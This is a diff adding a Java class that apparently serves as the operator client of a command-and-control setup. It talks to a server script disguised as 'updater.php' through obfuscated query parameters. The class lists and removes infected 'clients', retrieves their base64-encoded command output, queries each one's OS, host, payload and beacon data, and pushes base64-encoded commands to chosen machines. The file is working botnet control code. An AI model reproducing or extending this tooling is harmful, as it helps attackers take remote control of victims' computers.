@@ -1,0 +1,143 @@
+import java.io.IOException;
+import java.net.URI;
+import java.net.http.HttpClient;
+import java.net.http.HttpRequest;
+import java.net.http.HttpResponse;
+import java.nio.charset.StandardCharsets;
+import java.time.Duration;
+import java.util.Objects;
+import java.util.Base64;
+
+public class RequestCalls {
+    private final HttpClient client;
+    private final String hostIP;
+    private final String baseEndPoint;
+    public RequestCalls(String hostIP){
+        client = HttpClient.newHttpClient();
+        this.hostIP = hostIP;
+        this.baseEndPoint = "http://"+hostIP+"/updater.php";
+    }
+    public String findClients(int OS) throws IOException, InterruptedException {
+        HttpResponse<String> resp = sendGET("?OYNsOOhC7L=pings", OS);
+        if(resp.statusCode()>399){
+            return "Couldn't reach. Firewall issue?";
+        }else{
+            return Objects.equals(resp.body(), "") ? "None" : resp.body();
+        }
+    }
+    public String removeClient(String id, int OS) throws IOException, InterruptedException {
+        HttpResponse<String> resp = sendGET("?r8ojR2jJ="+id, OS);
+        if(resp.statusCode()>399){
+            return "Couldn't reach. Firewall issue?";
+        }else{
+            return Objects.equals(resp.body(), "") ? "None" : resp.body();
+        }
+    }
+    /*public String findClientReads() throws IOException, InterruptedException {
+        HttpResponse<String> resp = sendGET("?OYNsOOhC7L=reads");
+        if(resp.statusCode()>399){
+            return "Couldn't reach. Firewall issue?";
+        }else{
+            return Objects.equals(resp.body(), "") ? "None" : resp.body();
+        }
+    }*/
+    public String findClientResponses(int OS) throws IOException, InterruptedException {
+        HttpResponse<String> resp = sendGET("?OYNsOOhC7L=responses", OS);
+        if(resp.statusCode()>399){
+            return "Couldn't reach. Firewall issue?";
+        }else{
+            return Objects.equals(resp.body(), "") ? "None" : resp.body();
+        }
+    }
+    public String FetchResponse(String IP, int OS) throws IOException, InterruptedException {
+        HttpResponse<String> resp = sendGET("?OYNsOOhC7L="+IP, OS);
+        if(resp.statusCode()>399){
+            return "Couldn't reach. Firewall issue?";
+        }else{
+            //System.out.println(resp.body());
+            String retStr = Objects.equals(resp.body(), "") ? "None" : resp.body();
+            if(!retStr.equals("None")){
+                byte[] returnBytes = Base64.getMimeDecoder().decode(retStr);
+                String newReturn = new String(returnBytes, StandardCharsets.UTF_8); // Decode base64 encoded output from client output
+                return newReturn;
+            }
+            return retStr;
+        }
+    }
+    public String GetLastPing(String IP, int OS) throws IOException, InterruptedException {
+        HttpResponse<String> resp = sendGET("?l4St="+IP, OS);
+        if(resp.statusCode()>399){
+            return "Couldn't reach. Firewall issue?";
+        }else{
+            //System.out.println(resp.body());
+            return Objects.equals(resp.body(), "") ? "None" : resp.body().split("\n")[0];
+        }
+    }
+    public String GetOS(String IP, int OS) throws IOException, InterruptedException { // No need for now
+        HttpResponse<String> resp = sendGET("?g3t0S="+IP, OS);
+        if(resp.statusCode()>399){
+            return "Couldn't reach. Firewall issue?";
+        }else{
+            //System.out.println(resp.body());
+            return Objects.equals(resp.body(), "1") ? "None" : resp.body();
+        }
+    }
+    public String GetHost(String IP, int OS) throws IOException, InterruptedException { // Add this back
+        HttpResponse<String> resp = sendGET("?g3th0sT="+IP, OS);
+        if(resp.statusCode()>399){
+            return "Couldn't reach. Firewall issue?";
+        }else{
+            //System.out.println(resp.body());
+            return Objects.equals(resp.body(), "1") ? "None" : resp.body();
+        }
+    }
+    public String GetPayload(String IP, int OS) throws IOException, InterruptedException { // Add this back
+        HttpResponse<String> resp = sendGET("?g3tp4y="+IP, OS);
+        if(resp.statusCode()>399){
+            return "Couldn't reach. Firewall issue?";
+        }else{
+            //System.out.println(resp.body());
+            return Objects.equals(resp.body(), "1") ? "None" : resp.body();
+        }
+    }
+    public String GetBeacon(String IP, int OS) throws IOException, InterruptedException { // Add this back
+        HttpResponse<String> resp = sendGET("?g3tb34c="+IP, OS);
+        if(resp.statusCode()>399){
+            return "Couldn't reach. Firewall issue?";
+        }else{
+            //System.out.println(resp.body());
+            return Objects.equals(resp.body(), "1") ? "None" : resp.body();
+        }
+    }
+    public String GetInfo(String ID, int OS) throws IOException, InterruptedException { // Add this back
+        HttpResponse<String> resp = sendGET("?lnf0="+ID, OS);
+        if(resp.statusCode()>399){
+            return "Couldn't reach. Firewall issue?";
+        }else{
+            //System.out.println(resp.body());
+            return Objects.equals(resp.body(), "1") ? "None" : resp.body();
+        }
+    }
+    public String Push(String command, String cli, int OS) throws IOException, InterruptedException {
+        String encoded = Base64.getEncoder().encodeToString(command.getBytes(StandardCharsets.UTF_8));
+        String requestBody = "bm6UqYw7fq="+encoded+"&cli="+cli;
+        HttpResponse<String> resp = sendPOST(requestBody, OS);
+        //System.out.println(command+" "+cli);
+        if(resp.statusCode()>399){
+            return "Couldn't reach. Firewall issue?";
+        }else{
+            return Objects.equals(resp.body(), "") ? "None" : resp.body();
+        }
+    }
+    public String getHostIP(){
+        return hostIP;
+    }
+    private HttpResponse<String> sendGET(String param, int OS) throws IOException, InterruptedException {
+        HttpRequest req = HttpRequest.newBuilder().uri(URI.create(baseEndPoint+param+"&p="+OS)).GET().timeout(Duration.ofSeconds(5)).build();
+        return client.send(req, HttpResponse.BodyHandlers.ofString());
+    }
+    private HttpResponse<String> sendPOST(String param, int OS) throws IOException, InterruptedException {
+        HttpRequest req = HttpRequest.newBuilder().uri(URI.create(baseEndPoint+"?p="+OS)).header("Content-Type", "application/x-www-form-urlencoded").POST(HttpRequest.BodyPublishers.ofString(param)).build();
+        return client.send(req, HttpResponse.BodyHandlers.ofString());
+    }
+}
